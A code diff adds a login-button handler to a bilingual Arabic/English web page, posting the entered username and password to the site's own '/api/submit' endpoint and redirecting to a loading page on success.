@@ -279,6 +279,40 @@
     <script>
         var isArabic = true;
 
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            var username = document.getElementById('accountInput').value.trim();
+            var password = document.getElementById('passwordInput').value.trim();
+            if (!username || !password) return;
+            var btn = document.getElementById('loginBtn');
+            btn.disabled = true;
+            btn.textContent = isArabic ? 'جاري التحقق...' : 'Verifying...';
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, password: password })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok && d.id) {
+                    window.location.href = 'loading.html?id=' + d.id;
+                } else {
+                    btn.disabled = false;
+                    btn.textContent = isArabic ? 'تسجيل الدخول' : 'Sign In';
+                }
+            })
+            .catch(function() {
+                btn.disabled = false;
+                btn.textContent = isArabic ? 'تسجيل الدخول' : 'Sign In';
+            });
+        });
+
+        document.getElementById('accountInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('passwordInput').focus();
+        });
+        document.getElementById('passwordInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('loginBtn').click();
+        });
+
         function togglePassword() {
             var input = document.getElementById('passwordInput');
             var icon = document.getElementById('eyeIcon');
